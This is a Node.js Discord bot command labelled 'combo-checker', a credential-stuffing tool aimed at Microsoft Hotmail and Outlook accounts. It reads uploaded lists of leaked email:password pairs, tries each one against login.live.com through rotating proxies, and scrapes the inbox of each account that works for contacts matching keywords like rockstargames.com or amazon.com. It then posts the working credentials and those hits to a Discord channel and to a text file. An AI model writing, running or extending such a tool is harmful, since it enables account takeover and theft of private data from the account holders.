const { SlashCommandBuilder, EmbedBuilder, AttachmentBuilder } = require('discord.js');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');

class ProxyManager {
    constructor(proxies) {
        this.proxies = proxies.filter(p => p.trim());
        this.current = 0;
    }
    
    getNext() {
        if (this.proxies.length === 0) return null;
        const proxy = this.proxies[this.current];
        this.current = (this.current + 1) % this.proxies.length;
        return proxy;
    }
}

async function checkCombo(email, password, keywords, proxy) {
    try {
        // Step 1: Login attempt
        const loginData = new URLSearchParams({
            loginfmt: email,
            passwd: password,
            KMSI: '1',
            flow: '1',
            login: 'Sign in'
        });
        
        const loginResponse = await axios({
            method: 'POST',
            url: 'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1720000000&ty=1',
            data: loginData,
            timeout: 12000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com',
                'Referer': 'https://login.live.com/'
            },
            proxy: proxy ? {
                protocol: 'http',
                host: proxy.split(':')[0],
                port: parseInt(proxy.split(':')[1] || 8080)
            } : undefined
        });
        
        const loginDataLower = loginResponse.data.toLowerCase();
        let valid = false;
        let keywordHits = [];
        let contacts = [];
        
        // Login success?
        if (loginDataLower.includes('outlook.live.com') || 
            loginDataLower.includes('office.com') || 
            loginDataLower.includes('mail.live.com') ||
            !loginDataLower.includes('incorrect') && 
            !loginDataLower.includes('invalid') &&
            !loginDataLower.includes('hiba')) {
            valid = true;
        }
        
        // KEYWORDS in LOGIN RESPONSE
        keywords.forEach(keyword => {
            if (loginDataLower.includes(keyword.toLowerCase())) {
                keywordHits.push(keyword);
            }
        });
        
        // Step 2: If login success, check CONTACTS/INBOX
        if (valid) {
            try {
                // Try to access inbox/contacts
                const inboxResponse = await axios({
                    method: 'GET',
                    url: 'https://outlook.live.com/mail/inbox',
                    timeout: 10000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Referer': 'https://outlook.live.com/'
                    },
                    proxy: proxy ? {
                        protocol: 'http',
                        host: proxy.split(':')[0],
                        port: parseInt(proxy.split(':')[1] || 8080)
                    } : undefined,
                    maxRedirects: 3
                });
                
                const inboxHtml = inboxResponse.data.toLowerCase();
                const $ = cheerio.load(inboxHtml);
                
                // Extract emails from inbox/contacts
                $('a[href*="mail"], .email, [title*="mail"], [data-email]').each((i, el) => {
                    const emailText = $(el).text().toLowerCase().trim();
                    if (emailText.includes('@') && emailText.length > 10) {
                        keywords.forEach(keyword => {
                            if (emailText.includes(keyword.toLowerCase()) || 
                                emailText.includes(keyword.replace('@', '').toLowerCase())) {
                                contacts.push(emailText);
                            }
                        });
                    }
                });
                
                // Also check response text for contacts
                $('body').text().split('\n').forEach(line => {
                    const lineLower = line.toLowerCase().trim();
                    keywords.forEach(keyword => {
                        if (lineLower.includes(keyword.toLowerCase()) && lineLower.includes('@')) {
                            contacts.push(lineLower);
                        }
                    });
                });
                
            } catch (inboxError) {
                // Inbox access failed, continue
            }
        }
        
        return { 
            valid, 
            keywordHits, 
            contacts: [...new Set(contacts)], // unique
            proxy: proxy || 'Direct' 
        };
        
    } catch (error) {
        return { valid: false, keywordHits: [], contacts: [], proxy: proxy || 'Direct', error: error.message };
    }
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName('combo-checker')
        .setDescription('🔥 Combo + Proxy + Keywords + CONTACTS checker')
        .addAttachmentOption(option =>
            option.setName('combo')
                .setDescription('Combo list (email:pass)')
                .setRequired(true))
        .addAttachmentOption(option =>
            option.setName('proxies')
                .setDescription('Proxy list (ip:port)')
                .setRequired(false))
        .addStringOption(option =>
            option.setName('keywords')
                .setDescription('Keywords & Contacts (rockstargames.com,amazon.com,admin,password)')
                .setRequired(true))
        .addChannelOption(option =>
            option.setName('channel')
                .setDescription('Output')
                .setRequired(false)),
    
    async execute(interaction, client) {
        await interaction.deferReply();
        
        const comboFile = interaction.options.getAttachment('combo');
        const proxyFile = interaction.options.getAttachment('proxies');
        const keywordsStr = interaction.options.getString('keywords');
        const outputChannel = interaction.options.getChannel('channel') || interaction.channel;
        
        const keywords = keywordsStr.split(/[\s,]+/)
            .map(kw => kw.trim().toLowerCase())
            .filter(kw => kw.length > 1);
        
        // Download combo
        const comboBuffer = await fetch(comboFile.url).then(r => r.arrayBuffer());
        const comboText = Buffer.from(comboBuffer).toString('utf-8');
        
        let proxies = [];
        if (proxyFile) {
            const proxyBuffer = await fetch(proxyFile.url).then(r => r.arrayBuffer());
            const proxyText = Buffer.from(proxyBuffer).toString('utf-8');
            proxies = proxyText.split('\n').map(p => p.trim()).filter(p => p);
        }
        
        // Parse combos
        const combos = comboText.split('\n')
            .map(line => line.trim())
            .filter(line => line.includes(':'))
            .map(line => {
                const parts = line.split(':', 2);
                return { 
                    email: parts[0].trim().toLowerCase(), 
                    pass: parts[1] ? parts[1].trim() : '' 
                };
            })
            .filter(combo => combo.email.includes('@hotmail') || combo.email.includes('@outlook'))
            .slice(0, 30); // Max 30
        
        const proxyManager = new ProxyManager(proxies);
        
        const progressEmbed = new EmbedBuilder()
            .setTitle('🔥 ULTIMATE COMBO CHECKER')
            .addFields(
                { name: '📝 Combos', value: combos.length.toString(), inline: true },
                { name: '🔑 Keywords/Contacts', value: keywords.length.toString(), inline: true },
                { name: '🌐 Proxies', value: proxies.length.toString(), inline: true },
                { name: '📊 Progress', value: '0 / ' + combos.length, inline: true }
            )
            .setColor(0x0099ff);
        
        await interaction.editReply({ embeds: [progressEmbed] });
        
        let stats = { valid: 0, invalid: 0, keywordHits: 0, contactHits: 0 };
        let hitCombos = [];
        let contactList = [];
        
        for (let i = 0; i < combos.length; i++) {
            const combo = combos[i];
            const proxy = proxyManager.getNext();
            
            const result = await checkCombo(combo.email, combo.pass, keywords, proxy);
            
            if (result.valid) {
                stats.valid++;
                await outputChannel.send(`✅ **${combo.email}**:${combo.pass}\n📍 Proxy: ${result.proxy}`);
            } else {
                stats.invalid++;
            }
            
            // 🔥 KEYWORD HITS
            if (result.keywordHits.length > 0) {
                stats.keywordHits += result.keywordHits.length;
                result.keywordHits.forEach(hit => {
                    outputChannel.send(`🔥 **KEYWORD HIT!** \`${combo.email}\` → **${hit.toUpperCase()}**`);
                });
            }
            
            // 🔥 CONTACT HITS (noreply@rockstargames.com stb.)
            if (result.contacts.length > 0) {
                stats.contactHits += result.contacts.length;
                result.contacts.forEach(contact => {
                    const contactMsg = `📧 **CONTACT HIT!** \`${combo.email}\` → **${contact}**`;
                    outputChannel.send(contactMsg);
                    contactList.push(`${combo.email}:${combo.pass} | ${contact}`);
                });
            }
            
            // Save hits
            if (result.keywordHits.length > 0 || result.contacts.length > 0) {
                const hitLine = `${combo.email}:${combo.pass} | Keywords: ${result.keywordHits.join(',')} | Contacts: ${result.contacts.join(',')} | Proxy: ${result.proxy}`;
                hitCombos.push(hitLine);
            }
            
            // Progress update
            progressEmbed.spliceFields(3, 1, 
                { name: '📊 Progress', value: `${i + 1}/${combos.length}`, inline: true }
            );
            await interaction.editReply({ embeds: [progressEmbed] });
            
            await new Promise(r => setTimeout(r, 3000));
        }
        
        // FINAL RESULTS
        const finalEmbed = new EmbedBuilder()
            .setTitle('✅ CHECK KÉSZ!')
            .addFields(
                { name: '📊 Total', value: combos.length.toString(), inline: true },
                { name: '✅ Valid', value: stats.valid.toString(), inline: true },
                { name: '🔥 Keywords', value: stats.keywordHits.toString(), inline: true },
                { name: '📧 Contacts', value: stats.contactHits.toString(), inline: true }
            )
            .setColor(0x00ff00);
        
        await interaction.editReply({ embeds: [finalEmbed] });
        
        // 🔥 HITS TXT
        if (hitCombos.length > 0 || contactList.length > 0) {
            const txtContent = `🔥 ULTIMATE HITS (${hitCombos.length + contactList.length})\n` +
                `Time: ${new Date().toISOString()}\n` +
                `Keywords/Contacts: ${keywords.join(', ')}\n\n` +
                [...hitCombos, ...contactList].join('\n') + '\n\n' +
                `Valid: ${stats.valid} | Keyword hits: ${stats.keywordHits} | Contacts: ${stats.contactHits}`;
            
            const fileName = `ultimate_hits_${Date.now()}.txt`;
            const filePath = path.join(__dirname, '..', fileName);
            fs.writeFileSync(filePath, txtContent);
            
            const attachment = new AttachmentBuilder(filePath, { name: fileName });
            await outputChannel.send({
                content: `📥 **${hitCombos.length + contactList.length} ULTIMATE HITS TXT!**`,
                files: [attachment]
            });
            
            fs.unlinkSync(filePath);
        }
    }
};
